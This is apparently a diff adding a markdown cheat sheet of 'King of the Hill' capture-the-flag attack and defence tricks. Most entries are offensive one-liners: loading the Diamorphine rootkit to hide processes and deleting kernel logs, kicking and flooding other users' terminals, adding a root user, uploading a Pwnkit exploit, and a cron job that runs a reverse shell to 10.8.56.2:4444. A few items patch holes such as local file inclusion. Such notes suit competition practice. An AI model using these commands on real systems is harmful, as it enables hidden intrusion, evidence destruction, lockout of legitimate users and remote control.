@@ -1,0 +1,93 @@
+
+# King of The Hill
+KoTH - Attack & defense Tricks
+
+- Using rustscan
+- Connecting SSH without tty and hiding the process using rootkit
+    - ssh -T user@target.ip -p 1337
+        - w
+        - who
+        - tty
+        - ls /dev/pts;
+    - ps aux | grep notty
+        - git clone git@github.com:m0nad/Diamorphine.git
+        - make
+        - insmod diamorphine.ko
+        - kill -31 <PID>
+        - tail -f /var/log/kern.log
+        - rm /var/log/kern.log
+- Kicking people out of the machine using pkill
+    - pkill -9 -t pts/<ID>
+    - kill -9 <PID>
+- Kicking all users connected in SSH
+    - kill `ps aux | grep pts | awk ‘{print $2}’`;
+- Kicking all people connected to a given user on SSH
+    - pkill -9 -U <user>
+- Using ps and grep to search for pts/sshd
+    - ps aux | grep sshd
+- Trolling your opponent
+    - cat /dev/urandom > /dev/pts/<ID> &
+    - ./nyancat > /dev/pts/<ID> &
+    - ./xpl -n /dev/pts/<ID> “cat /dev/urandom”
+    - ./breker.sh <ID>
+- Bypass rbash
+    - vim
+        - :set shell=/bin/bash
+        - :shell
+- Patch /etc/sudoers
+    - vim /etc/sudoers
+        - remove everything except: root ALL=(ALL=ALL) ALL
+        - remove #includedir /etc/sudoers.d
+- Patch SUID
+    - Find / -perm /4000 2>/dev/null
+    - chmod -s /usr/bin/pkexec
+- Removing SSH keys
+    - cd ~/.ssh
+    - rm id_rsa 
+    - rm id_rsa.pub
+- LFI Patch
+    - <?php include ($_GET['page']); ?>    ------>  <?php include (str_replace(“../”, “”, $_GET['page'])); ?>
+- Patch Command Injection
+    - remove <?php …………  system(...)  ……… ?>
+- Capturing flags using find and grep
+    - cd /home; grep -ri thm{ 2>/dev/null
+    - cd /var/www; grep -ri thm{ 2>/dev/null
+    - cd /root; grep -ri thm{ 2>/dev/null
+    - find / -name user.txt 2>/dev/null
+    - find / -name flag.txt 2>/dev/null
+    - find / -name flag 2>/dev/null
+    - find / 2>/dev/null | grep flag
+- Adding user with root privilege
+    - adduser USER
+    - add USER ALL=(ALL:ALL) ALL to /etc/sudoers
+- Removing execution permissions form binaries
+    - chmod -x /usr/bin/wget
+    - chmod -x /usr/bin/curl
+    - chmod -x /usr/bin/chattr
+- Uploading file using SSH
+    - ssh user@target.ip -p1337 “cat Pwnkit” < Pwnkit
+- Protect king using while
+    - while true; do chattr -ia /root/king.txt; echo msoodb > /root/king.txt; chattr +ia /root/king.txt; set -o noclobber /root/king.txt ; done &
+- Blocking password authentication in ssh
+    - PasswordAuthentication no in /etc/ssh/sshd_config
+    - service sshd restart
+- Using crontab to load a script with a reverse shell every 1 minute
+    - echo "/bin/sh -i >& /dev/tcp/10.8.56.2/4444 0>&1" > /tmp/.persistence.sh
+    - chmod +x .persistence.sh
+    - vim /etc/crontab
+        - * * * * * root /tmp/.persistence.sh
+
+## kit
+- deploy kit
+- /bin/bash linpeas.sh
+- get root shell
+- config ssh for ONLY root
+    - cat /tmp/.kit/authorized_keys > authorized_keys
+    - chmod 600 authorized_keys
+    - /etc/ssh/sshd_config
+        - AllowUsers root
+        - PasswordAuthentication no
+    - sudo systemctl restart sshd
+- /etc/sudoers
+    - remove everything except: root ALL=(ALL=ALL) ALL
+    - remove #includedir /etc/sudoers.d
